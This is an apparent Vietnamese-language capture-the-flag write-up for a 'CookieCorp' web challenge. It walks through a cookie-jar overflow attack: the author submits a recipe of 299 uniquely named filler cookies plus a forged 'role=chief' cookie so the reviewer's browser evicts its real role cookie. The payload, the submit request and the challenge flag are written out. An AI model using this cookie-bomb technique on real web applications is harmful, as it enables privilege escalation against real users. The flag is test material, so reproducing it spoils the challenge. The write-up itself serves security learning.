# CookieCorp

## Xác định API tạo và submit recipe

Register 1 tài khoản, vào dashboard có các trang:

```text
/dashboard
/builder
```

Gửi thử 1 batch:

![alt text](image.png)

Recipe sau khi lưu được submit:

```text
Submitted! The inspector will review batch a200520c2c2b80dc885d2ccf shortly. Watch it on the batch page.
```

## Đọc source của trang review

Sau khi Inspector nhận recipe, trang review nhúng recipe vào JavaScript:

![alt text](image-1.png)

File `/static/js/mixer.js` chứa hàm xử lý ingredient:

![alt text](image-2.png)

Như vậy ingredient sau:

```json
{"name":"flour","value":"2cups"}
```

được browser xử lý thành:

```text
role=chief; path=/
```

Sau khi chạy lần lượt toàn bộ ingredient, Inspector gọi API seal với body:

![alt text](image-3.png)

Thử các ingredient điều khiển role:

```json
{"name":"role","value":"chief"}

{"name":"chief","value":"1"}

{"name":"isChief","value":"true"}

{"name":"golden_seal","value":"1"}
```

Các cookie phụ này không thay đổi quyền. Recipe vẫn nhận seal thường vì cookie xác thực và role hiện có của Inspector vẫn được giữ nguyên.

Mình cũng thử đưa thuộc tính cookie vào value:

```json
{"name":"role","value":"chief; Path=/api"}
```

Ứng dụng lọc semicolon, khoảng trắng và control character trong ingredient. Giá trị bị biến thành:

```text
role=chiefPath=/api
```

Do đó không thể dùng một ingredient để chèn thêm thuộc tính `Path`, `Domain` hoặc cookie mới.

Mình sẽ tạo cookie-bomb vì mỗi ingredient được `mixer.js` biến thành một cookie:

```js
document.cookie = ing.name + '=' + (ing.value || '') + '; path=/';
```

nên tạo nhiều cookie có tên khác nhau sẽ làm cookie jar của host đầy. Khi đó browser phải loại bớt cookie cũ.

Recipe khai thác có đúng 300 ingredient:

- Ingredient thứ 1 đến thứ 299: cookie tên `bomb000` đến `bomb298`, mỗi cookie có value `x`.
- Ingredient thứ 300: cookie `role=chief`.

Các filler phải có tên khác nhau. Nếu dùng lại một tên, browser chỉ cập nhật cookie cũ và tổng số cookie không tăng.

Payload JSON title và danh sách 299 filler như sau:

```json
{
  "title": "cookie-bomb-role",
  "ingredients": [
    {"name":"bomb000","value":"x"},
    {"name":"bomb001","value":"x"},
    ...............
    {"name":"bomb298","value":"x"},
    {"name":"role","value":"chief"}
  ]
}
```

Server trả về:

![alt text](image-4.png)

Dùng ID vừa nhận để submit:

```http
POST /api/recipe/0e75a71c67dad450713297d4/submit HTTP/1.1
Host: tomorrow.web.2026.sunshinectf.games
```

Response:

```json
{"ok":true,"status":"queued"}
```

Mở recipe:

![alt text](image-5.png)

## Flag

```text
sun{c00kie_jar_0verfl0w_ev1cts_the_chief}
```
